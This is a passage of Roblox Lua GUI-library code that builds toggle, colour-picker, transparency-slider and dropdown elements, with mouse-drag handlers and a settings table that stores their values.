									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									
									Color.BackgroundColor3 = MainUIColor 
									
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
									end 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][tabtext][text] = Element.value 
										update() 
										callback(Element.value) 
									end 
								elseif type == "ToggleColor" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255)} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 









									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 170) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = false 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 

									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "ToggleTrans" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 190) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = true 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									local Transpick = C.INST("ImageButton") 
									local Transcolor = C.INST("ImageLabel") 
									local Transdrag = C.INST("Frame") 

									Transpick.Name = "Transpick" 
									Transpick.Parent = Frame 
									Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transpick.Position = C.UDIM2(0, 10, 0, 167) 
									Transpick.Size = C.UDIM2(0, 180, 0, 15) 
									Transpick.AutoButtonColor = false 
									Transpick.Image = "rbxassetid://3887014957" 
									Transpick.ScaleType = Enum.ScaleType.Tile 
									Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
									Transpick.ZIndex = 3 

									Transcolor.Name = "Transcolor" 
									Transcolor.Parent = Transpick 
									Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transcolor.BackgroundTransparency = 1.000 
									Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
									Transcolor.Image = "rbxassetid://3887017050" 
									Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
									Transcolor.ZIndex = 3 

									Transdrag.Name = "Transdrag" 
									Transdrag.Parent = Transcolor 
									Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
									Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
									Transdrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
									if data.default.Transparency ~= nil then 
										Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
									end 
									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateTrans() 
										local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
										Transdrag.Position = C.UDIM2(0, x, 0, 0) 
										Element.value.Transparency = (x/178) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 
									Transpick.MouseButton1Down:Connect(function() 
										updateTrans() 
										moveconnection = mouse.Move:Connect(function() 
											updateTrans() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateTrans() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "Dropdown" then 
									tabsize = tabsize + C.UDIM2(0,0,0,39) 
									Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = Element.value.Dropdown 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
